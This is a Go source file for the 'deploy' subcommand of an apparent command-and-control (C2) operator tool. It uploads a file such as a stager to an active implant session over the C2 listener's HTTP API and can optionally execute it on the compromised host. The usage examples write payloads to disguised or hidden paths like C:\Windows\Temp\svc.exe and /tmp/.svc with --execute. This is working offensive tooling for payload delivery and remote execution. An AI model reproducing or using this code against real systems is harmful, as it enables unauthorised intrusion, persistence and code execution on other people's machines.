package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"

	"github.com/spf13/cobra"
)

var deployCmd = &cobra.Command{
	Use:   "deploy",
	Short: "Deploy a file (e.g., Burrow stager) to an active C2 session",
	Long: `Upload a binary or file to an active implant session via the C2 listener.
The file is delivered on the next agent checkin and optionally executed.

Examples:
  trusted deploy --session <ID> --file ./stager-windows-amd64.exe --path C:\\Windows\\Temp\\svc.exe --execute
  trusted deploy --session <ID> --file ./burrow-linux-amd64 --path /tmp/.svc --execute
  trusted deploy --session <ID> --file ./tool.exe --path C:\\Users\\Public\\tool.exe`,
	RunE: func(cmd *cobra.Command, args []string) error {
		c2URL, _ := cmd.Flags().GetString("c2-url")
		sessionID, _ := cmd.Flags().GetString("session")
		filePath, _ := cmd.Flags().GetString("file")
		remotePath, _ := cmd.Flags().GetString("path")
		execute, _ := cmd.Flags().GetBool("execute")

		if c2URL == "" || sessionID == "" || filePath == "" || remotePath == "" {
			return fmt.Errorf("--c2-url, --session, --file, and --path are all required")
		}

		// Read the file
		data, err := os.ReadFile(filePath)
		if err != nil {
			return fmt.Errorf("read file: %w", err)
		}

		// Build multipart request
		var body bytes.Buffer
		writer := multipart.NewWriter(&body)

		writer.WriteField("session_id", sessionID)
		writer.WriteField("file_path", remotePath)
		if execute {
			writer.WriteField("execute", "true")
		}

		part, err := writer.CreateFormFile("file", filepath.Base(filePath))
		if err != nil {
			return fmt.Errorf("create form file: %w", err)
		}
		part.Write(data)
		writer.Close()

		// POST to C2 listener
		url := c2URL + "/api/deploy"
		req, err := http.NewRequest("POST", url, &body)
		if err != nil {
			return fmt.Errorf("create request: %w", err)
		}
		req.Header.Set("Content-Type", writer.FormDataContentType())

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			return fmt.Errorf("deploy request: %w", err)
		}
		defer resp.Body.Close()

		respBody, _ := io.ReadAll(resp.Body)

		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("deploy failed (%d): %s", resp.StatusCode, string(respBody))
		}

		var result map[string]interface{}
		json.Unmarshal(respBody, &result)

		fmt.Printf("[+] File queued for delivery\n")
		fmt.Printf("    Session:  %s\n", sessionID[:8])
		fmt.Printf("    File:     %s (%d bytes)\n", filepath.Base(filePath), len(data))
		fmt.Printf("    Remote:   %s\n", remotePath)
		fmt.Printf("    Execute:  %v\n", execute)
		if did, ok := result["delivery_id"]; ok && did != nil {
			fmt.Printf("    Delivery: %v\n", did)
		}
		return nil
	},
}

func init() {
	rootCmd.AddCommand(deployCmd)

	deployCmd.Flags().String("c2-url", "", "C2 listener URL (e.g., http://10.0.0.1:8080)")
	deployCmd.Flags().String("session", "", "Target session ID")
	deployCmd.Flags().String("file", "", "Local file to deploy")
	deployCmd.Flags().String("path", "", "Remote path to write the file")
	deployCmd.Flags().Bool("execute", false, "Execute the file after delivery")
	deployCmd.MarkFlagRequired("c2-url")
	deployCmd.MarkFlagRequired("session")
	deployCmd.MarkFlagRequired("file")
	deployCmd.MarkFlagRequired("path")
}
